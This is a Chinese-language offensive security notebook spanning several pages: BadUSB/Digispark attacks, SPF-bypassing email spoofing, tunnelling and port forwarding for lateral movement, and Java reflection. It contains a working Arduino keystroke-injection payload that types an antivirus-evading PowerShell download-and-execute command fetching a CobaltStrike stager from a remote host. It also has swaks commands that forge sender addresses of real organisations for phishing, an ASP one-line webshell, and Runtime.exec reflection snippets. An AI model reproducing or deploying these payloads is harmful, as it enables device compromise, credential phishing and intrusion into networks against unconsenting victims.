一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘插入电脑时，恶意代码会被加载并执行。 BadUsb的结构 BadUsb的内部结构如下 可以看到，U盘大致由两部分组成，一部分是芯片引导程序，一部分是闪存区域。 控制器负责与PC的通讯和识别，闪存用来做数据存储； 闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互； BadUsb攻击 BadUsb的攻击与HID攻击类似，也是插入电脑后加载并执行恶意代码从而完成攻击。 BadUsb插入PC后，会模拟出一个虚拟键盘，同时执行我们事先写入到固件中的代码来敲击相应的按键，输入攻击代码从而完成一些恶意行为。 BadUsb优势 只需要使用通用的USB设备（比如U盘）就可以完成HID攻击。 恶意代码烧录到固件中，而这部分区域是杀毒软件无法访问的区域，因此大部分杀毒软件是根本无法应对BadUsb攻击的 常见攻击场景 黑客故意将写入了恶意程序的BadUsb丢在某个场所里，如果有人因为好奇心将BadUsb插入电脑中，那么其中的恶意程序就会运行，黑客从而可以控制这个人的电脑。比如护网行动，好奇的蓝方人员的电脑被红方人员以这种方式控制😨。 工具准备 某宝开发板（关键词digispark） Ardunio IDE 下载地址https://www.arduino.cc/en/software 下载完后打开Arduino IDE-->文件-->首选项-->附加管理器网址：http://digistump.com/package_digistump_index.json 工具-->开发板-->开发板管理器-->安装Digistump AVR 软件包 Digispark驱动 https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7 CobaltStrike 开发板连接 板子成功连接电脑后，可以在设备管理器中看到 遇到一个问题就是，这玩意插上去没有显示端口，Ardunio连接不了，而且一直闪红灯😢。 经过搜索才知道, 这块板子接上电源只保持 5s 的连接, 然后自动运行板子内的程序。 所以正确的烧录方式是先点击上传, 等到终端提示接入设备的时候, 再接入设备烧录程序。 DigiKeyboard.h使用 主要利用该库来模拟键盘和鼠标输入 在github上找到了数字按键表 预设常量 https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h 常用函数 DigiKeyboard.println(\"text\"); # 用于向模拟键盘发送文本并在计算机上输入一行字符并自动在末尾添加一个回车符 DigiKeyboard.sendKeyStroke(key); # 用于模拟按下和释放一个指定的按键 DigiKeyboard.delay(ms) # 用于在执行后续操作前暂停一段时间，单位为毫秒 弹计算器 Arduino代码 #include \"DigiKeyboard.h\" String a; String b; String c; void setup() { DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(300); DigiKeyboard.sendKeyStroke(57); // 开启CapsLock大写锁定键绕过中文输入法问题(windows大小写不敏感) DigiKeyboard.delay(300); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // 按下Win+R键 DigiKeyboard.delay(800); DigiKeyboard.println(\"calc\"); // 打开计算器 DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(57); // 关闭CapsLock大写锁定键 } void loop() { } PowerShell Bypass火绒上线CS 干货 | 我的powershell免杀之路 (qq.com) 原始payload powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.23.102:8000/one_liner.ps1'))\" Bypass powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://192.168.23.102:8000/one_liner.ps1') 转化为Arduino代码 #include \"DigiKeyboard.h\" String a; String b; String c; void setup() { DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(300); DigiKeyboard.sendKeyStroke(57);//开启CapsLock大写锁定键 DigiKeyboard.delay(300); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//按下Win+R键 DigiKeyboard.delay(800); DigiKeyboard.println(\"powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://192.168.23.102:8000/one_liner.ps1')\"); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(57);//关闭CapsLock大写锁定键 } void loop() { } 防御 由于恶意代码内置于设备初始化固件中，而不是通过autorun.inf等媒体自动播放文件进行控制，因此无法通过禁用媒体自动播放进行防御，杀毒软件更是无法检测设备固件中的恶意代码。目前也没有什么有效的方式去防御BadUSB，毕竟无法阻挡电脑去识别键盘鼠标此类的HID设备。所以说针对BadUSB的防御方法还是在于人员的安全意识上，当发现可疑的U盘时切莫因好奇插入自己的电脑。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:05:59 "},"02.后渗透/社会工程学/钓鱼/SPF伪造.html":{"url":"02.后渗透/社会工程学/钓鱼/SPF伪造.html","title":"初探邮件钓鱼","keywords":"","body":"SMTP协议 邮件实现详解（一）------邮件发送的基本过程与概念 - YSOcean - 博客园 邮件实现详解（二）------手工体验smtp和pop3协议 - YSOcean - 博客园 SMTP协议使用的端口 端口 25 是 SMTP 服务器之间连接最常用的端口。如今，终端用户网络的防火墙通常会阻止这个端口，因为垃圾邮件发送者试图滥用它来发送大量垃圾邮件。 端口 465 曾经专门用于具备安全套接字层（SSL）加密的 SMTP。但 SSL 已被Transport Layer Security（TLS）取代，因而现代电子邮件系统不再使用这个端口。该端口仅出现在传统（过时）系统中。 端口 587 现在是电子邮件提交的默认端口。经过该端口的 SMTP 通信使用 TLS 加密。 端口 2525 与 SMTP 没有正式关联，但某些电子邮件服务在上述端口被堵塞的情况下，通过这个端口提供 SMTP 传输。 SPF协议 由来与原理 spf全称为（Sender Policy Framework），即发件人策略框架 目前所进行的邮件通信，使用的是smtp协议（Simple Mail Transfer Protocol），即简单邮件传输协议。但是smtp是没有很好的安全措施的，一个简单的例子为：发件人的邮箱地址可以由发信方任意声明，即发件人邮箱伪造。 spf就是为了解决这个问题，spf的原理： 假设邮件服务器收到了一封邮件，发件人的IP为：192.6.6.6，并且声称发件人为 email@example.com。为了确认发件人不是伪造的，邮件服务器会查询 example.com的spf记录。如果该域的spf记录设置允许IP为 192.6.6.6 主机发送邮件，则服务器认为这封邮件是合法的，否则，会退信（即收件人收不到邮件），或者邮件躺在垃圾箱。邮箱伪造可以声明他来自example.com，但是却无法操作 example.com 的 DNS解析记录，也无法伪造自己的IP地址，所以SPF还是可以有效防御邮件伪造的。 通俗的来讲，A 和 B 两个人建立通信，A向B发送信息，B 检查 A是不是在常用地(白名单)发的信息，如果不是，则拒收信息。 语法 一条 SPF 记录定义了一个或者多个 mechanism，而 mechanism 则定义了哪些 IP 是允许的，哪些 IP 是拒绝的。 这些 mechanism 包括以下几类： all | ip4 | ip6 | a | mx | ptr | exists | include 每个 mechanism 可以有四种前缀： \"+\" Pass（通过） \"-\" Fail（拒绝） \"~\" Soft Fail（软拒绝） \"?\" Neutral（中立） 测试时，将从前往后依次测试每个 mechanism。如果一个 mechanism 包含了要查询的 IP 地址（称为命中），则测试结果由相应 mechanism 的前缀决定。默认的前缀为+。如果测试完所有的 mechanisms 也没有命中，则结果为 Neutral。 除了以上四种情况，还有 None（无结果）、PermError（永久错误）和 TempError（临时错误）三种其他情况。对于这些情况的解释和服务器通常的处理办法如下： 结果 含义 服务器处理办法 Pass 发件 IP 是合法的 接受来信 Fail 发件 IP 是非法的 退信 Soft Fail 发件 IP 非法，但是不采取强硬措施 接受来信，但是做标记 Neutral SPF 记录中没有关于发件 IP 是否合法的信息 接受来信 None 服务器没有设定 SPF 记录 接受来信 PermError 发生了严重错误（例如 SPF 记录语法错误） 没有规定 TempError 发生了临时错误（例如 DNS 查询失败） 接受或拒绝 注意，上面所说的「服务器处理办法」仅仅是 SPF 标准做出的建议，并非所有的邮件服务器都严格遵循这套规定。 Mechanisms 下面介绍上面提到的 mechanism： all 表示所有 IP，肯定会命中。因此通常把它放在 SPF 记录的结尾，表示处理剩下的所有情况。例如： \"v=spf1 -all\" 拒绝所有（表示这个域名不会发出邮件） \"v=spf1 +all\" 接受所有（域名所有者认为 SPF 是没有用的，或者根本不在乎它） ip4 格式为ip4:或者ip4:/，指定一个 IPv4 地址或者地址段。如果prefix-length没有给出，则默认为/32。例如： \"v=spf1 ip4:192.168.0.1/16 -all\" 只允许在 192.168.0.1 ~ 192.168.255.255 范围内的 IP ip6 格式和ip4的很类似，默认的prefix-length是/128。例如： \"v=spf1 ip6:1080::8:800:200C:417A/96 -all\" 只允许在 1080::8:800:0000:0000 ~ 1080::8:800:FFFF:FFFF 范围内的 IP a 和 mx 这俩的格式是相同的，以a为例，格式为以下四种之一： a a/ a: a:/ 会命中相应域名的 a 记录（或 mx 记录）中包含的 IP 地址（或地址段）。如果没有提供域名，则使用当前域名。例如： \"v=spf1 mx -all\" 允许当前域名的 mx 记录对应的 IP 地址。 \"v=spf1 mx mx:deferrals.example.com -all\" 允许当前域名和 deferrals.example.com 的 mx 记录对应的 IP 地址。 \"v=spf1 a/24 -all\" 类似地，这个用法则允许一个地址段。 例如，这是一个比较常见的 SPF 记录，它表示支持当前域名的 a 记录和 mx 记录，同时支持一个给定的 IP 地址；其他地址则拒绝： v=spf1 a mx ip4:173.194.72.103 -all include 格式为include:，表示引入域名下的 SPF 记录。注意，如果该域名下不存在 SPF 记录，则会导致一个PermError结果。例如： \"v=spf1 include:example.com -all\" 即采用和 example.com 完全一样的 SPF 记录 exists 格式为exists:。将对执行一个 A 查询，如果有返回结果（无论结果是什么），都会看作命中。 ptr 格式为ptr或者ptr:。使用ptr机制会带来大量很大开销的 DNS 查询，所以连官方都不推荐使用它。 关于v=spf1 这是必须的，这个表示采用 SPF 1 版本，现在它的最新版本就是第 1 版。 Modifiers SPF 记录中还可以包括两种可选的 modifier；一个 modifier 只能出现一次。 redirect 格式为redirect= 将用给定域名的 SPF 记录替换当前记录。 exp 格式为exp=，目的是如果邮件被拒绝，可以给出一个消息。而消息的具体内容会首先对执行 TXT 查询，然后执行宏扩展得到。 Demo 查询对应域名是否有SPF记录 nslookup -type=txt domain 找到v=spf1（表示采用 SPF 1 版本）的txt记录 SPF配置如下 v=spf1 ip4:45.249.212.32 ip4:45.249.212.35 ip4:45.249.212.255 ip4:45.249.212.187/29 ip4:45.249.212.191 ip4:185.176.76.210 ip4:168.195.93.47 ip4:103.69.140.247 -all 解释：依次匹配ipv4地址，如果ip地址全不匹配就拒绝 存在风险的SPF记录 未设置SPF 可以直接伪造邮件 设置不当--使用了不恰当的限定词~,+ From https://saucer-man.com/information_security/452.html#cl-6 SPF绕过进阶 https://www.freebuf.com/articles/system/238215.html 实践 swaks使用 --from test@qq.com //发件人邮箱； --ehlo qq.com //伪造邮件ehlo头，填发件人邮箱的域名 --body \"http://www.baidu.com\" //引号中的内容即为邮件正文 --header \"Subject:hello\" //邮件头信息，subject为邮件标题 --data test.eml //将正常源邮件的内容保存作为正常邮件发送 --server mail.smtp2go.com -p 2525 -au 用户名 -ap 密码 //邮箱服务器代发，用于绕过SPF 基本流程 自己用邮箱编辑好钓鱼邮件，然后先发送给自己，然后查看已发送邮件，点击导出为eml文件： 编辑eml文件，删除from值之前的信息，然后修改From和To的内容（这两是看到的收件人和发件人） 使用如下命令发送 无SPF swaks --to xxx@qq.com --from jiaowuchu@swust.edu.cn --data aaa.eml --ehlo jiaowuchu@swust.edu.cn 效果 邮件原文 有SPF # kali中自带 swaks --to xxx@qq.com --from hr@huawei.com --data aaa.eml --server mail.smtp2go.com -p 2525 -au -ap 总结 这里学习了一下如何进行邮件伪造 还需要学习的一些问题 如何找到目标人员的邮箱地址 https://forum.butian.net/share/351 如何增加邮件可信度，附件木马的制作 https://mp.weixin.qq.com/s/hi1YgUUHnFDGf26cUXJkQQ 附件木马的免杀 参考文章 https://saucer-man.com/information_security/452.html#cl-8 https://service.mail.qq.com/detail/124/995 http://www.renfei.org/blog/introduction-to-spf.html Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-11-11 13:47:15 "},"02.后渗透/隧道搭建.html":{"url":"02.后渗透/隧道搭建.html","title":"端口转发与代理搭建","keywords":"","body":"前置知识 SOCKS代理 SOCKS全称为Protocol For Sessions Traversal Across Firewall Securely，是一种代理协议，其只是简单地传递数据包，而并不关心是何种应用协议，标准端口为1080。 SOCKS代理有SOCKS4和SOCKS5两个版本。SOCKS4只支持TCP，而SOCKS5在SOCKS4 的基础上进一步扩展，可以支持UDP和各种身份验证机制等协议。 在内网渗透中，通过搭建SOCKS代理，可以与目标内网主机进行通信，避免多次使用端口转发。 探测目标各种协议是否出网及对应隧道搭建 ICMP ping 114.114.114.114 -n 1 #Windows ping 114.114.114.114 -c 1 #Linux 隧道搭建 通过data部分来传输数据 icmpsh -t host 发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在] -d milliseconds 请求时间间隔（毫秒） -o milliseconds 响应超时时间（毫秒） -s bytes 最大数据缓冲区大小（字节） 攻击机 pip2 install impacket # 安装依赖 sudo python2 icmpsh_m.py 攻击机IP 目标机IP 目标机上 sysctl -w net.ipv4.icmp_echo_ignore_all=1 #关闭本地ICMP应答，防止不稳定 ./icmpsh.exe -t 攻击机IP 【内网学习笔记】6、ICMP隧道工具使用 | TeamsSix HTTP curl http://www.baidu.com DNS nslookup baidu.com 隧道搭建 zfl9/dns2tcp: 将 dns 查询从 udp 转为 tcp 的实用工具 (github.com) vaycore/DNStxt-exp: 一个提供查询 TXT 记录的 DNS 服务利用工具。例如：可配合 Windows 下的 certutil 工具传输小文件（64KB） (github.com) TCP Telent ip 代理搭建 反向代理搭建--目标能访问VPS Nps 服务端（公网服务器） sudo ./nps install #安装 sudo nps start #启动 sudo nps stop #停止 sudo nps reload #服务端配置文件重载 配置文件/etc/nps/conf/nps.conf，主要修改 # http代理 http_proxy_ip=0.0.0.0 http_proxy_port=80 https_proxy_port=443 https_just_proxy=true ##桥接 bridge_type=tcp bridge_port=8024 ##客户端与服务端连接端口 bridge_ip=0.0.0.0 # web端设置 web_host=xxx # 公网ip web_username=admin # web端登录账号密码 可以修改 web_password=de1ta web_port = 8080 # web端端口 默认配置运行nps服务端启动会占用80，8080，8024端口 客户端（内网主机） 使用无配置文件模式 使用该命令启动客户端即可连接至服务端 成功连接后，点击隧道按钮来创建隧道 proxifier使用 填写配置客户端时配置的账密 Frp 服务端（公网服务器） 配置frps.ini [common] bind_port = 7000 # 客户端与服务端通信的端口 启动 sudo nohup ./frps -c frps.ini & 客户端（内网主机） 配置frpc.ini [common] server_addr = 47.120.7.67 # 服务端IP server_port = 7000 # 通信端口 [socks5_proxy] type = tcp remote_port = 8888 # 服务端代理端口 plugin = socks5 use_encryption = true # 是否加密 use_compression = true # 是否压缩 启动 start/b C:\\tmp\\frpc.exe -c frpc.ini Ligolo-ng 服务端（公网机器） ./proxy 0.0.0.0:53 -autocert 客户端（内网主机） ./agent -connect ip:53 回到服务端（公网机器） ligolo-ng » ifconfig # 查看agent端网络信息 回到bash 添加获得的网段信息 sudo ip route add 192.168 .110 .0 / 24 dev ligolo ligolo-ng » start_tunnel # 开启隧道 SoftEtherVPN SoftEtherVPN CS的socks4代理--不好用 首先需要将心跳sleep设置为0 Beacon右键 创建了socks4隧道 socks4:CS服务端IP:选择的port 正向代理搭建--VPS能访问目标 Neo-reGeorg 生成服务端 python neoreg.py generate -k password 上传对应的tunnel至目标主机 在本地建立Socks5代理 python neoreg.py -k password -u http://xx/tunnel.php 多级代理 场景 Stowaway ph4ntonn/Stowaway: 👻Stowaway -- Multi-hop Proxy Tool for pentesters (github.com) 控制端VPS 开启监听 # 默认监听0.0.0.0，-s为密码 ./linux_x64_admin -l 8000 -s 123 节点管理 detail 展示在线节点的详细信息 topo 展示在线节点的父子关系 use 使用某个agent exit 退出 第一层内网 win2012-1连接VPS端口 # --reconnect重连间隔时间 ./windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8 控制端VPS use 0 # 进入win2012-1节点 socks 7777 admin admin # 创建第一层内网代理 第二层内网 控制端VPS use 0 # 进入win2012-1节点 listen win7连接win2012-1端口 # --reconnect重连间隔时间 ./windows_x64_agent.exe -c 192.168.10.9:10000 -s 123 --reconnect 8 Frp 第一层内网 服务端（VPS） 配置frps.ini [common] bind_port = 7000 # 客户端与服务端通信的端口 启动 sudo nohup ./frps -c frps.ini & 客户端（Win2012-1） 配置frpc.ini [common] server_addr = 192.168.125.134 # 服务端IP server_port = 7000 # 通信端口 [socks5_proxy] type = tcp remote_port = 8888 # 服务端代理端口 plugin = socks5 use_encryption = true # 是否加密 use_compression = true # 是否压缩 第二层内网 Win2012-1 配置frps.ini [common] bind_addr = 192.168.10.2 bind_port = 7000 配置frpc.ini [common] server_addr = 192.168.125.134 # 服务端IP server_port = 7000 # 通信端口 [socks5_proxy] type = tcp remote_port = 8888 # 服务端代理端口 use_encryption = true # 是否加密 use_compression = true # 是否压缩 # plugin = socks5 # 不能加上这个 #相较于一级代理，增加如下代理服务器frps.ini local_ip = 192.168.10.2 local_port = 7777 启动 start/b C:\\tmp\\frps.exe -c frps.ini start/b C:\\tmp\\frpc.exe -c frpc.ini win7 配置frpc.ini [common] server_addr = 192.168.125.134 server_port = 7000 [socks5_proxy] type = tcp remote_port = 8888 # 服务端代理端口 use_encryption = true # 是否加密 use_compression = true # 是否压缩 plugin = socks5 端口转发 常见场景 目标有公网IP ​ 假设此时已经获取了Windows Server 2012的控制权,需要登录其远程桌面查看情况，但是防火墙对3389端口做了限制，不允许外网机器对3389端口进行连接。那么，通过端口转发，可以将3389端口转发到其他防火墙允许的端口上，如4444端口。 ​ 效果：绕过防火墙限制，通过4444端口进行RDP远程连接 内网主机端口转发到DMZ区主机端口 ​ 假设已经获取Windows Server 2012的控制权，经过信息收集，获得内网中MySQL服务器的SSH登录凭据，接下来需要登录这台服务器。但是服务器位于内网，无法直接通过IP地址进行访问，所以需要通过端口映射，将 MySQL服务器的22端口映射到Windows Server 2012上的端口如2222。 ​ 效果：访问DMZ区的Windows Server 2012的2222端口实质上是访问内网MySql服务器的22端口 目标无公网IP ​ 假设已经获取 Windows Server 2012的控制权，需要登录其远程桌面查看情况，但是Windows Server 2012没有公网IP地址,无法直通过IP地址进行访问,所以需要公网VPS监听一个端口，将Windows Server 2012的3389端口转发到VPS的端口如4444上。 ​ 效果：访问VPS的4444端口实质上是访问Windows Server 2012的3389端口 如何转发 Windows netsh 端口转发（双网卡用） netsh仅支持TCP协议， 适用于双网卡服务器 将内网的3389端口转发到外网的6666端口上，实现访问外网的6666端口即访问内网的3389端口 启动转发 #查看现有规则 netsh interface portproxy show all #添加转发规则 netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389 取消转发 #删除转发规则 netsh interface portproxy delete v4tov4 listenport=6666 #xp需要安装ipv6 netsh interface ipv6 install Linux iptables 端口转发（高权限用） Linux端口复用 » 1ight 将内网的3389端口转发到外网的3389端口上 编辑配置文件 vim /etc/sysctl.conf net.ipv4.ip_forward = 1#开启IP转发 关闭服务 service iptables stop 配置规则 假设 需要访问的内网地址：10.1.1.11（Windows） 内网边界web服务器：192.168.100.100（Linux） iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389 将目标IP为192.168.100.100且目标端口为3389的TCP数据包，转发到10.1.1.11的3389端口。 iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100 将目标IP为10.1.1.11且目标端口为3389的TCP数据包，发送出去时，将源IP地址改为192.168.100.100 (相当于实现了网络地址转换（NAT），将内部私有网络中的IP地址转换为公网IP地址) 保存并重启服务 service iptables save && service iptables start SSH端口转发 SSH 端口转发功能能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。其实这一技术就是我们常常听说的隧道(tunnel)技术，原因是 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输。 推荐阅读：SSH 端口转发教程 | 三点水 (lotabout.me) 本地转发 本地端口转发指的是在本机上发起请求，由 ssh client 转发到远程的机器上 假设A为攻击机VPS，B为DMZ区主机，C为内网主机，A能访问B # ssh client即攻击机VPS执行 ssh -CfNg -L 1234:ip_c:3389 user_b@ip_b 参数解释 -C 选项使用压缩算法进行数据传输，可以提高传输效率。 -f 选项将SSH会话放入后台运行。 -N 选项表示不执行远程命令，仅用于建立隧道。 -g 选项允许其他主机连接该隧道。 -L 1234:ip_c:3389 user_b@ip_b 选项指定在本地监听1234端口，并将所有通过该端口的流量转发到目标主机C的3389端口。 实现了访问攻击机1234端口实质上是访问内网主机C的3389端口 远程转发 把最终请求的发起方（机器 A）为“本地”，服务所在的机器 B/C 为“远程”，在本地机器上执行 ssh 命令就称为“本地转发”，在远程机器上执行命令就称为“远程转发” 假设A为攻击机VPS，B为DMZ区主机，C为内网主机，A不能访问B，B能访问A # ssh cilent即DMZ区主机执行 ssh -CfNg -R 9992:ip_c:3389 user_a@ip_a 参数解释 -R 9992:ip_c:3389 user_a@ip_a 选项指定在远程主机（即攻击机vps）监听9992端口，并将所有通过该端口的流量转发到本地的内网主机C的3389端口。 实现了访问攻击机9992端口实际上是访问内网主机C的3389端口 动态转发 本地转发和远程转发都只转发一个端口，动态转发可以转发所有端口 # ssh cilnet即攻击机VPS执行 ssh -qTfnN -D 1234 user_b@ip_b 参数解释 -q 选项表示安静模式，减少输出信息。 -T 选项表示不分配终端。 -f 选项将SSH会话放入后台运行。 -n 选项表示不执行远程命令。 -N 选项表示不执行远程命令，仅用于建立隧道。 -D 1080 选项指定在本地监听1080端口，并将流量通过SSH通道转发。 在本地建立一个SSH动态端口转发（SOCKS代理），将本地的1080端口设置为SOCKS代理服务。通过这个代理，可以将本地的网络流量通过SSH加密通道转发到远程主机B上，从而访问内网主机C 全局代理流量 Linux：Proxychinas Windows：Proxifier 遇到的问题 reGeorg上传的tunnel无法解析 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 17:07:38 "},"03.代码审计/.Net/.net渗透.html":{"url":"03.代码审计/.Net/.net渗透.html","title":".net渗透","keywords":"","body":".net WEB ASP一句话木马 z=execute(\"response.clear:response.write(\"\"right\"\"):response.end\") viewstate反序列化 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-10-19 11:23:37 "},"03.代码审计/JAVA/01.基础知识/Java反射.html":{"url":"03.代码审计/JAVA/01.基础知识/Java反射.html","title":"Java反射","keywords":"","body":"反射 概念 反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类，都能够知道这个类中的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。 类加载流程如下 JVM在第一次读取到一种class类型时，将其加载进内存后会为其创建一个Class类型的实例，并在该实例中保存了该class的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息。 相关类 java.lang.Class //类对象 java.lang.reflect.Constructor //类的构造器对象 java.lang.reflect.Field //类的属性对象 java.lang.reflect.Method //类的方法对象 java.lang.reflect.Modifier //类的修饰符对象 使用 Class类型实际上是一个名叫Class的class public final class Class { private Class() {} } 可以看出Class类的构造器是私有的，所以只有JVM能够创建Class对象。 如果我们想使用就需要以下几种方法获得： 获得Class类 //调用Class类的静态方法forName获取某个类的Class类实例 Class clz = Class.forName(\"User\"); 注：类名默认为类完整路径,如java.lang.Runtime,通常使用这个来获得Class类实例 //调用某个类实例的getClass()方法 Class clz = (new User()).getClass(); //访问某个类实例的class属性，这个属性就存储着这个类对应的Class类的实例 Class clz = (new User()).class; 获得构造函数 Constructor[] getConstructors() ：只返回public构造函数 Constructor[] getDeclaredConstructors() ：返回所有构造函数 Constructor<> getConstructor(类... parameterTypes) : 匹配和参数配型相符的public构造函数 Constructor<> getDeclaredConstructor(类... parameterTypes) ： 匹配和参数配型相符的构造函数 实例化类 clz.newInstance(); 实际上是调用了该类的无参构造函数 所以前提条件： 该类有无参构造函数，并且是公有的 获得成员方法 Method method=Class.getMethod(String name, 类... parameterTypes) //返回该类所声明的public方法 Method method=Class.getDeclaredMethod(String name, 类... parameterTypes) //返回该类所声明的所有方法 //第一个参数为方法名，第二个参数为这个方法的参数类型 Method method=Class.getMethods() //获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法 Method method=Class.getDeclaredMethods() // 获取该类中的所有方法 使用成员方法 method.invoke(类实例, [该方法的参数类型]); 如果调用这个方法是普通方法，第一个参数就是类对象； 如果调用这个方法是静态方法，第一个参数就是类； 获取成员变量 Field[] getFields() ：获取所有 public 修饰的成员变量 Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符 Field getField(String name) 获取指定名称的 public 修饰的成员变量 Field getDeclaredField(String name) 获取指定的成员变量 实例 常用的RCE Runtime.getRuntime().exec(\"calc\"); 注意Runtime这个类的构造函数是私有的，所以我们正常只能通过公有的方法Runtime.getRuntime()来获取到 Runtime 对象 通过反射实现上述代码 import java.lang.reflect.Method; //首先需要获得Runtime类的Class实例 Class clz = Class.forName(\"java.lang.Runtime\"); //获得Runtime类的getRuntime方法 Method getruntime = clz.getMethod(\"getRuntime\"); //调用该方法获得Runtime对象 Object runtime = getruntime.invoke(clz); //获得Runtime类的exec方法 Method exec = clz.getMethod(\"exec\",String.class); //调用exec方法执行命令 exec.invoke(runtime,\"calc\"); 整合成一句 Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")), \"calc.exe\"); 强制访问私有，保护 setAccessible(true); 上述命令执行代码可以转为 import java.lang.reflect.Constructor; public class RuntimeTest { public static void main(String[] args) throws Exception { Class c1= Class.forName(\"java.lang.Runtime\"); // 获得构造函数 Constructor m = c1.getDeclaredConstructor(); // 获得访问私有方法和属性的权限 m.setAccessible(true); c1.getMethod(\"exec\", String.class).invoke(m.newInstance(), \"calc\"); } } 修改final字段 只有final修饰，并且为间接赋值，可以修改 如果是final+static修饰，并且为间接赋值，需要先去掉final修饰符才能修改 // 获得modifiers Field nameModifyField = nameField.getClass().getDeclaredField(\"modifiers\"); // 修改权限 nameModifyField.setAccessible(true); // 去除final修饰符 nameModifyField.setInt(nameField, nameField.getModifiers() & ~Modifier.FINAL); // 修改Field值 nameField.set(m,new StringBuilder(\"Drunkbaby Too Silly\")); // 重新添加上final修饰符 nameModifyField.setInt(nameField, nameField.getModifiers() & ~Modifier.FINAL); Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-09-27 14:36:49 "},"03.代码审计/JAVA/01.基础知识/Java泛型.html":{"url":"03.代码审计/JAVA/01.基础知识/Java泛型.html","title":"Java泛型","keywords":"","body":"泛型 java 泛型详解-绝对是对泛型方法讲解最详细的，没有之一 - little fat - 博客园 (cnblogs.com) 介绍 List stringList = new ArrayList(); // 使用泛型类List，并传入String类型实参 stringList.add(\"Hello\"); stringList.add(\"World\"); String firstElement = stringList.get(0); // 获取列表中的第一个元素 定义一个泛型类List，其中T为类型形参，表示列表中元素的类型。在使用该泛型类时，需要传入具体的类型实参作为类型形参的取值。 类型形参指的是在定义泛型类、接口或方法时使用的占位符类型。它们用于参数列表、返回值类型、局部变量等位置，用来表示具体的数据类型还未确定。通常使用大写字母来表示类型形参，例如T、E、K等。 类型实参指的是在使用泛型类、接口或方法时实际传入的具体数据类型。它们用于替换类型形参，使泛型类、接口或方法具体化。 泛型的作用 代码复用 类型安全，编译器会检查类型 引入泛型后，它将提供类型的约束，提供编译前的检查： 泛型类 //此处T可以随便写为任意标识，常见的如 Type Element Key value //在实例化泛型类时，必须指定T的具体类型 public class Generic{ //key这个成员变量的类型为T,T的类型由外部指定 private T key; public Generic(T key) { //泛型构造方法形参key的类型也为T，T的类型由外部指定 this.key = key; } public T getKey(){ //泛型方法getKey的返回值类型为T，T的类型由外部指定 return key; } public static void main(String[] args) { //泛型的类型参数只能是类类型（包括自定义类），不能是简单类型 //传入的实参类型需与泛型的类型参数类型相同，即为Integer. Generic genericInteger = new Generic(123456); //传入的实参类型需与泛型的类型参数类型相同，即为String. Generic genericString = new Generic(\"key_vlaue\"); System.out.println(\"泛型测试 key is \" + genericInteger.getKey()); System.out.println(\"泛型测试 key is \" + genericString.getKey()); } } 泛型接口 //定义一个泛型接口 public interface Generator { public T next(); } /** * 传入泛型实参时： * 定义一个生产器实现这个接口,虽然我们只创建了一个泛型接口Generator * 但是我们可以为T传入无数个实参，形成无数种类型的Generator接口。 * 在实现类实现泛型接口时，如已将泛型类型传入实参类型，则所有使用泛型的地方都要替换成传入的实参类型 * 即：Generator，public T next();中的的T都要替换成传入的String类型。 */ public class FruitGenerator implements Generator { private String[] fruits = new String[]{\"Apple\", \"Banana\", \"Pear\"}; @Override public String next() { Random rand = new Random(); return fruits[rand.nextInt(3)]; } } 泛型通配符 Ingeter是Number的一个子类，但是Generic不能被看作为Generic的子类。 由此可以看出:同一种泛型可以对应多个版本（因为参数类型是不确定的），不同版本的泛型类实例是不兼容的。 因此我们需要一个在逻辑上可以表示同时是Generic和Generic父类的引用类型。由此类型通配符?应运而生。 类型通配符一般是使用？代替具体的类型实参，此处的？和Number、String、Integer一样都是一种实际的类型，可以把？看成所有类型的父类。是一种真实的类型。 泛型方法 泛型类中的使用了泛型的成员方法并不是泛型方法 public class Generic{ public Generic(T key) { this.key = key; } } 该泛型类的构造方法形参key的类型也为T，但是这个方法并不是泛型方法，只是类中一个普通的成员方法。因为该方法能使用T是因为在声明泛型类时T已经被指定了。 